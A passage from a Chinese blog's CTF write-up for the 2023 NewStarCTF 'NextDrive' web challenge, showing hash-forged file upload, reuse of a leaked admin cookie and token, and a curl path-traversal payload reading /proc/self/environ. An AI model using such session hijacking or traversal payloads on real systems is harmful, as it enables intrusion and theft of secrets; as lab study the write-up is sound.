Concept.png&quot;,&quot;hash&quot;:&quot;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&quot;,&quot;size&quot;:440707,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341557215,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;Windows 12 Concept.png&quot;&#125;,&#123;&quot;name&quot;:&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;,&quot;hash&quot;:&quot;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&quot;,&quot;size&quot;:330767,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341557290,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;&#125;,&#123;&quot;name&quot;:&quot;不限速，就是快！.jpg&quot;,&quot;hash&quot;:&quot;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&quot;,&quot;size&quot;:32920,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341557304,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;不限速，就是快！.jpg&quot;&#125;,&#123;&quot;name&quot;:&quot;test.req.http&quot;,&quot;hash&quot;:&quot;83a065c4db184a69d902a6e5cd56fa43ccb6dc6d0eaee7ae92ebd31ae983e0b4&quot;,&quot;size&quot;:1085,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341559212,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;test.req.http&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>这个文件叫test.req.http 与test.res.http不同 可能有信息泄露</p>
<p>发现在我的资源区可以上传文件，先随便上传一个文件，抓包看看</p>
<p>一共抓到两个包，后一个就是上传文件的请求，前一个check包中应该进行了检测，可以看到我们请求的数据只有hash值和文件名，应该就是根据文件名和hash值来检测的，前文我们已经有了test.req.http的hash值，直接改包上传即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219192834401.png?lastModify=1715614296" alt="image-20240219192834401"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219192917184.png?lastModify=1715614296" alt="image-20240219192917184"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219193247047.png?lastModify=1715614296" alt="image-20240219193247047"></p>
<p>这时候就能看到资源区出现了1.txt，打开可以看到应该是一个分享文件的请求，发现其中的cookie和我们的不一样，猜测应该是admin对应的cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/info/drive/sharezone HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiIyMTBjZmQ2NTkyZWM0ZjRjMmMzYjljZTY3ZDExNDVmZmQxNWM5MjZlNjI3YmMwYjU2MGUxMmUxNmI2Yjg0ZDg0In0uXh5BcmMxSFBCZV41LSAhLw.XW5QWmdTHl1HLAZLck9MAgs7BQk3ABQKFCoHGSNNTAUPOVgLYldIDRYvUBR3GUwCCTlWDWcBSl0TfwYfdU0aAl1pAQFnABgAEXcFHnAWTgcIOlVbMQAeXUJ4BkghT01RC2hVD2RXHgBHL1MbcRhNXAw+AV1jW0oKR35SG38YS10</span><br><span class="line">Host: localhost:21920</span><br><span class="line">Origin: http://localhost:21920</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Referer: http://localhost:21920/sharezone</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0</span><br><span class="line">sec-ch-ua: &quot;Microsoft Edge&quot;;v=&quot;119&quot;, &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br></pre></td></tr></table></figure>

<p>将uid和token修改成上面的内容，发现我们的账号变成了admin。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219193427513.png?lastModify=1715614296" alt="image-20240219193427513"></p>
<p>自己的资源区中有个share.js文件，下载下来看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const Router = require(&quot;koa-router&quot;);</span><br><span class="line">const router = new Router();</span><br><span class="line">const CONFIG = require(&quot;../../runtime.config.json&quot;);</span><br><span class="line">const Res = require(&quot;../../components/utils/response&quot;);</span><br><span class="line">const FileSignUtil = require(&quot;../../components/utils/file-signature&quot;);</span><br><span class="line">const &#123; DriveUtil &#125; = require(&quot;../../components/utils/database.utilities&quot;);</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">const &#123; verifySession &#125; = require(&quot;../../components/utils/session&quot;);</span><br><span class="line">const logger = global.logger;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * @deprecated</span><br><span class="line"> * ! FIXME: 发现漏洞，请进行修改</span><br><span class="line"> */</span><br><span class="line">router.get(&quot;/s/:hashfn&quot;, async (ctx, next) =&gt; &#123;</span><br><span class="line">    const hash_fn = String(ctx.params.hashfn || &#x27;&#x27;)</span><br><span class="line">    const hash = hash_fn.slice(0, 64)</span><br><span class="line">    const from_uid = ctx.query.from_uid</span><br><span class="line">    const custom_fn = ctx.query.fn</span><br><span class="line"> </span><br><span class="line">    // 参数校验</span><br><span class="line">    if (typeof hash_fn !== &quot;string&quot; || typeof from_uid !== &quot;string&quot;) &#123;</span><br><span class="line">        // invalid params or query</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;Invalid Params&quot;);</span><br><span class="line">        ctx.status = 400; // Bad Request</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 是否为共享的文件</span><br><span class="line">    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)</span><br><span class="line">    if (!IS_FILE_EXIST) &#123;</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;File Not Found&quot;);</span><br><span class="line">        ctx.status = 404; // Not Found</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 系统中是否存储有该文件</span><br><span class="line">    let IS_FILE_EXIST_IN_STORAGE</span><br><span class="line">    try &#123;</span><br><span class="line">        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn))</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;Internal Server Error&quot;);</span><br><span class="line">        ctx.status = 500; // Internal Server Error</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line">    if (!IS_FILE_EXIST_IN_STORAGE) &#123;</span><br><span class="line">        logger.error(`File $&#123;hash_fn.yellow&#125; not found in storage, but exist in database!`)</span><br><span class="line">        ctx.set(&quot;X-Error-Reason&quot;, &quot;Internal Server Error&quot;);</span><br><span class="line">        ctx.status = 500; // Internal Server Error</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 文件名处理</span><br><span class="line">    let filename = typeof custom_fn === &quot;string&quot; ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));</span><br><span class="line">    filename = filename.replace(/[\\\/\:\*\&quot;\&#x27;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi, &quot;_&quot;)</span><br><span class="line"> </span><br><span class="line">    // 发送</span><br><span class="line">    ctx.set(&quot;Content-Disposition&quot;, `attachment; filename*=UTF-8&#x27;&#x27;$&#123;encodeURIComponent(filename)&#125;`);</span><br><span class="line">    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span><br><span class="line">    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e =&gt; &#123;</span><br><span class="line">        logger.error(`Error while sending file $&#123;hash_fn.yellow&#125;`)</span><br><span class="line">        logger.error(e)</span><br><span class="line">        ctx.status = 500; // Internal Server Error</span><br><span class="line">        return ctx.res.end();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>

<p>&#x2F;s&#x2F;后的内容为hashfn的值，其中前64位作为hash，请求中的参数from_uid的值作为const from_uid的值，用于后续验证文件是否可共享，是否存在于系统。在通过两个检测后，就会发给客服端，其中对于文件名基本没有过滤，我们通过..&#x2F;穿越目录访问环境变量即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.get(&quot;/s/:hashfn&quot;, async (ctx, next) =&gt; &#123;</span><br><span class="line">    const hash_fn = String(ctx.params.hashfn || &#x27;&#x27;)</span><br><span class="line">    const hash = hash_fn.slice(0, 64)</span><br><span class="line">    const from_uid = ctx.query.from_uid</span><br><span class="line">    const custom_fn = ctx.query.fn</span><br></pre></td></tr></table></figure>

<p>inux下的环境变量位于&#x2F;proc&#x2F;self&#x2F;environ</p>
<p>最后的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://node4.buuoj.cn:29720/s/469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900/../../../../proc/self/environ?from_uid=100000 -o 1.txt</span><br></pre></td></tr></table></figure>

<p> 然后看1.txt文件即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219193601631.png?lastModify=1715614296" alt="image-20240219193601631"></p>
<p>结束了 终于写完了 这week5要写吐了 好难好难好难</p>
<p>接下来就是先把java和反序列化的课看完 然后再补补misc</p>
<p>QAQ</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/')">2023-NewstarCTF-wp</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=2023-NewstarCTF-wp&amp;url=http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/wp/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>wp<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/13/%E5%8F%8D%E5%BC%B9shell/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">反弹shell</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/15/2023-NKCTF-wp/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023-NKCTF-wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/05/15/2023-NKCTF-wp/" title="2023-NKCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-NKCTF-wp</div></div></a></div><div><a href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-第一届“帕鲁杯”CTF-wp</div></div></a></div><div><a href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-XYCTF-wp</div></div></a></div><div><a href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-蓝桥杯-wp</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NEW-STAR-WEB"><span class="toc-number">1.</span> <span class="toc-text">NEW STAR    WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2"><span class="toc-number">1.1.</span> <span class="toc-text">week 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">游戏高手</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#include-0%E3%80%820"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">include 0。0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-sql"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unserialize%EF%BC%9F"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">Unserialize？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload-again"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">Upload again!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">R!!C!!E!!</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">1.2.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Include-%F0%9F%8D%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">Include 🍐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium-sql"><span class="toc-number">1.2.2.</span> <span class="toc-text">medium_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-Gadget"><span class="toc-number">1.2.3.</span> <span class="toc-text">POP Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">R!!!C!!!E!!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GenShin"><span class="toc-number">1.2.5.</span> <span class="toc-text">GenShin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OtenkiGirl"><span class="toc-number">1.2.6.</span> <span class="toc-text">OtenkiGirl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-number">1.3.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">逃</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#More-Fast"><span class="toc-number">1.3.1.</span> <span class="toc-text">More Fast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#midsql"><span class="toc-number">1.3.2.</span> <span class="toc-text">midsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-disk"><span class="toc-number">1.3.3.</span> <span class="toc-text">flask disk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InjectMe"><span class="toc-number">1.3.4.</span> <span class="toc-text">InjectMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PharOne"><span class="toc-number">1.3.5.</span> <span class="toc-text">PharOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OtenkiBoy"><span class="toc-number">1.3.6.</span> <span class="toc-text">OtenkiBoy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5"><span class="toc-number">1.4.</span> <span class="toc-text">week5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialize-Again"><span class="toc-number">1.4.1.</span> <span class="toc-text">Unserialize Again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final"><span class="toc-number">1.4.2.</span> <span class="toc-text">Final</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ye%E2%80%99s-Pickle"><span class="toc-number">1.4.3.</span> <span class="toc-text">Ye’s Pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pppython"><span class="toc-number">1.4.4.</span> <span class="toc-text">pppython?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A4%8D%E7%9B%98"><span class="toc-number">1.4.5.</span> <span class="toc-text">4-复盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NextDrive"><span class="toc-number">1.4.6.</span> <span class="toc-text">NextDrive</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/java%E5%8F%8D%E5%B0%84/" title="java反射">java反射</a><time datetime="2024-05-15T11:45:09.000Z" title="发表于 2024-05-15 19:45:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp">2023-蓝桥杯-wp</a><time datetime="2024-05-15T02:39:09.000Z" title="发表于 2024-05-15 10:39:09">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp">2023-第一届“帕鲁杯”CTF-wp</a><time datetime="2024-05-15T02:36:58.000Z" title="发表于 2024-05-15 10:36:58">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp">2023-XYCTF-wp</a><time datetime="2024-05-15T02:31:24.000Z" title="发表于 2024-05-15 10:31:24">2024-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/15/2023-NKCTF-wp/" title="2023-NKCTF-wp">2023-NKCTF-wp</a><time datetime="2024-05-15T02:27:01.000Z" title="发表于 2024-05-15 10:27:01">2024-05-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div 